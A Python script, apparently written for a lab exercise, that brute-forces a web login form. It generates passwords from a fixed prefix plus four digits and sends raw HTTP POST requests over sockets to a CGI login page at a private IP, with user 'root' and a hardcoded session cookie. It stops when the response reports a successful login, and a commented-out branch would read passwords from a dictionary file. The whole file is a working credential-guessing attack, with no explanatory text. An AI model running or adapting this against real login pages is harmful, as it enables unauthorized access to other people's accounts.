import socket
import sys
import time
fname = './dictpasswd.txt'
target = '<p>login success</p>'
#passchar_list = '1234567890'
passchar_list = '1234'
'''
with open(fname, 'r') as f:
    dictpasswds = f.readlines()
    for dictpasswd in dictpasswds:
        passwd = dictpasswd.rstrip('\n')
        print(passwd)
'''
passwd0 = 'abcd'
start_t = time.time()
for i4 in passchar_list:
    passwd4 = i4
    for i5 in passchar_list:
        passwd5 = i5
        for i6 in passchar_list:
            passwd6 = i6
            for i7 in passchar_list:
                passwd7 = i7
                
                passwd = passwd0 + passwd4 + passwd5 + passwd6 + passwd7
                print(passwd)
                mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                mysock.connect(('192.168.65.3', 80))
                fname = './dictpasswd.txt'
                msg = 'POST /test/bbslogin.cgi HTTP/1.1\r\n'
                msg = msg + 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n'
                msg = msg + 'Accept-Encoding: deflate\r\n'
                msg = msg + 'Accept-Language: ja,en-US;q=0.9,en;q=0.8\r\n'
                msg = msg + 'Cache-Control: max-age=0\r\n'
                msg = msg + 'Connection: keep-alive\r\n'
                #msg = msg + 'Conenction: close'
                msg = msg + 'Content-Length: 36\r\n'
                msg = msg + 'Content-Type: application/x-www-form-urlencoded\r\n'
                msg = msg + 'Cookie: PHPSESSID=d3d0gidb8m7np53bnarfvb13v6\r\n'
                msg = msg + 'Host: 192.168.65.3\r\n'
                msg = msg + 'Origin: http://192.168.65.3\r\n'
                msg = msg + 'Referer: http://192.168.65.3/test/bbslogin.cgi\r\n'
                msg = msg + 'Upgrade-Insecure-Requests: 1\r\n'
                msg = msg + 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36\r\n'
                msg = msg + '\r\n'
                msg = msg + f'title={passwd}&author=root&text=dddd\r\n'
                cmd = msg.encode()
                mysock.send(cmd)

                while True:
                    data = mysock.recv(4096)
                    if (len(data) < 1):
                        break
                    content = data.decode()
                    if target in content:
                        print(time.time() - start_t)
                        print("yes", passwd)
                        sys.exit(0)
                mysock.close()
            end_t = time.time()
            print(end_t - start_t)